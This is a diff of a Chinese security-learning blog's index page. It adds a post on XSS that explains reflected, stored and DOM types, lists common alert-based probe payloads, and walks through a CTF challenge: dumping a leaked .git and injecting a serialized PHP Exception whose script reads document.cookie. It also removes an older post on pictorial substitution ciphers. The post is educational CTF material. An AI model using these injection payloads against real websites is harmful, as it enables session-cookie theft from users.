@@ -177,6 +177,106 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/03/xss%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gorgeousdays">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/11/03/xss%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">XSS攻击</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-11-03 22:35:41 / 修改时间：22:36:41" itemprop="dateCreated datePublished" datetime="2020-11-03T22:35:41+08:00">2020-11-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>XSS根源就是没完全过滤客户端提交的数据,客户端提交的数据本来是应用需要的，但恶意攻击者可能在提交的数据中插入一些符号以及javascript代码，使得这些数据成为应用代码的一部分。</p>
+<p>sql注入拼接的是操作数据库的sql语句。xss拼接的是网页的html代码。拼接合适的html代码去执行恶意的js语句。</p>
+<p>例如原有一个textbox的代码为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;address1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;value1from&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果用户输入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">!-</span></span></span><br></pre></td></tr></table></figure>
+<p>则执行代码变为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;address1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">!-</span> &quot;&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果用户输入<code>&quot;onfocus=&quot;alert(document.cookie)</code>代码所触发的事件也会有改变也会被改变。所以XSS攻击的威力取决于用户输入什么样的脚本。</p>
+<h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>提交数据 实现xss 但只对这次访问产生影响，并持久性攻击。</p>
+<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>提交数据 实现xss 并且存进了数据库，别人访问这个页面就会自动触发</p>
+<h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>DOM XSS的代码并不需要服务器参与，触发XSS靠的是浏览器端的DOM解析，完全是客户端的事情。从效果上来说 它也是反射型XSS。</p>
+<h4 id="如何检测是否存在XSS"><a href="#如何检测是否存在XSS" class="headerlink" title="如何检测是否存在XSS"></a>如何检测是否存在XSS</h4><p>发送语句给服务器，如果服务器没有进行过滤，服务器则会返回给客户端，则服务器存在XSS漏洞。判断XSS漏洞即主要看服务其端给客户端的响应。</p>
+<p>常见的发送位置：留言板、评论、搜索</p>
+<h4 id="XSS检测总结"><a href="#XSS检测总结" class="headerlink" title="XSS检测总结"></a>XSS检测总结</h4><h5 id="常用XSS检测"><a href="#常用XSS检测" class="headerlink" title="常用XSS检测"></a>常用XSS检测</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>各种绕过参考链接。</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/applelife/p/10477583.html#_label8">https://www.cnblogs.com/applelife/p/10477583.html#_label8</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tugenhua0707/p/10909284.html#_labe3">https://www.cnblogs.com/tugenhua0707/p/10909284.html#_labe3</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qw_xingzhe/article/details/80712840">https://blog.csdn.net/qw_xingzhe/article/details/80712840</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ricardojxu/p/12856312.html">https://www.cnblogs.com/ricardojxu/p/12856312.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/90536.htm">https://www.jb51.net/article/90536.htm</a></p>
+<h4 id="XSS题型训练平台"><a href="#XSS题型训练平台" class="headerlink" title="XSS题型训练平台"></a>XSS题型训练平台</h4><p><a target="_blank" rel="noopener" href="http://test.ctf8.com/">http://test.ctf8.com/</a></p>
+<h4 id="例题：-BJDCTF-2nd-xss之光"><a href="#例题：-BJDCTF-2nd-xss之光" class="headerlink" title="例题：[BJDCTF 2nd]xss之光"></a>例题：[BJDCTF 2nd]xss之光</h4><h5 id="判断是否存在git泄露"><a href="#判断是否存在git泄露" class="headerlink" title="判断是否存在git泄露"></a>判断是否存在git泄露</h5><p>1.构造URL<code>/.git/config</code>  存在可下载文件 发现存在git泄露</p>
+<p>2.使用 <strong>dirsearch、御剑</strong>等工具扫描后台</p>
+<p>发现存在git泄露</p>
+<h5 id="通过Githack获取泄露的源代码"><a href="#通过Githack获取泄露的源代码" class="headerlink" title="通过Githack获取泄露的源代码"></a>通过Githack获取泄露的源代码</h5><p>通过<code>python Githack.py &lt;url&gt;/.git/</code>命令获取到<code>index.php</code>文件 需要<strong>python2版本</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure>
+<h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>仅看到是一个反序列化，但是不知道类，则可以用php的内置类进行反序列化构造，可以用Error类或者Expection类来进行反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到结果后构造url访问</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//a0a58185-02d8-4b85-8dbb-f5a991c8b45c.node3.buuoj.cn/?yds_is_so_beautiful=&lt;结果&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现flag存在于cooike中</p>
+<p>也可以通过bp传入反序列化后的结果得到flag</p>
+<h5 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h5><h5 id="https-blog-csdn-net-qq-45521281-article-details-105812056"><a href="#https-blog-csdn-net-qq-45521281-article-details-105812056" class="headerlink" title="https://blog.csdn.net/qq_45521281/article/details/105812056"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105812056">https://blog.csdn.net/qq_45521281/article/details/105812056</a></h5>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/22/IA-32%E5%AF%84%E5%AD%98%E5%99%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1238,89 +1338,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/01/Crypto%E7%AC%94%E8%AE%B0-%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E6%8D%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="gorgeousdays">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/09/01/Crypto%E7%AC%94%E8%AE%B0-%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E6%8D%A2/" class="post-title-link" itemprop="url">Crypto学习笔记(替换密码-图形替换)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-09-01 19:36:16" itemprop="dateCreated datePublished" datetime="2020-09-01T19:36:16+08:00">2020-09-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-08 22:40:27" itemprop="dateModified" datetime="2020-09-08T22:40:27+08:00">2020-09-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Crypto/" itemprop="url" rel="index"><span itemprop="name">Crypto</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h4><p>特点：</p>
-<p><img src="/2020/09/01/Crypto%E7%AC%94%E8%AE%B0-%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E6%8D%A2/1.png" alt></p>
-<p>各字母对应位置的格子形状，就是对应符号</p>
-<p>密码表:</p>
-<p><img src="/2020/09/01/Crypto%E7%AC%94%E8%AE%B0-%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E6%8D%A2/2.png" alt></p>
-<h5 id="圣党武士密码"><a href="#圣党武士密码" class="headerlink" title="圣党武士密码"></a>圣党武士密码</h5><p>猪圈密码的变种</p>
-<h4 id><a href="#" class="headerlink" title></a><img src="/2020/09/01/Crypto%E7%AC%94%E8%AE%B0-%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E6%8D%A2/3.png" alt></h4><h4 id="夏多密码"><a href="#夏多密码" class="headerlink" title="夏多密码"></a>夏多密码</h4><p>类似指针钟表</p>
-<p>I AM IN DANGER.SEND HELP(我有危险，速来增援)可以加密成</p>
-<p><img src="/2020/09/01/Crypto%E7%AC%94%E8%AE%B0-%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E6%8D%A2/4.png" alt></p>
-<h4 id="标准银河密码"><a href="#标准银河密码" class="headerlink" title="标准银河密码"></a>标准银河密码</h4><p><img src="/2020/09/01/Crypto%E7%AC%94%E8%AE%B0-%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E6%8D%A2/5.png" alt></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1392,7 +1409,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-count">35</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
